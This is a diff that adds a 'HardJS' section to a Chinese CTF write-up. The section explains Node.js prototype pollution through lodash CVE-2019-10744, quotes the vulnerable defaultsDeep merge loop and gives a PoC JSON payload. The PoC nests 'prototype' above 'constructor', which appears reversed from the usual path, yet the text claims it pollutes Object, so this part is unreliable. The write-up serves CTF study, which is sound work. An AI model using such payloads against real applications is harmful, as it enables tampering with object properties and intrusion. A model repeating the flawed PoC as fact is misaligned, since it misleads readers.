@@ -111,3 +111,27 @@ php_value zend.script_encoding "UTF-7"
 ## 参考资料
 
 [https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp](https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp)
+
+## HardJS
+
+nodejs原型链污染
+
+用``npm audit``分析源码
+
+发现是``lodash``的一个CVE ``CVE-2019-10744``
+
+利用点是
+
+```js
+for(var i=0;i<raws.length ;i++){
+    lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));
+
+    var sql = "delete from `html` where id = ?";
+    var result = await query(sql,raws[i].id);
+}
+```
+
+```Poc
+{"type":"test","content":{"prototype":{"constructor":{"a":"b"}}}}
+```
+在合并时便会在Object上附加a=b这样一个属性，任意不存在a属性的原型为Object的对象在访问其a属性时均会获取到b属性
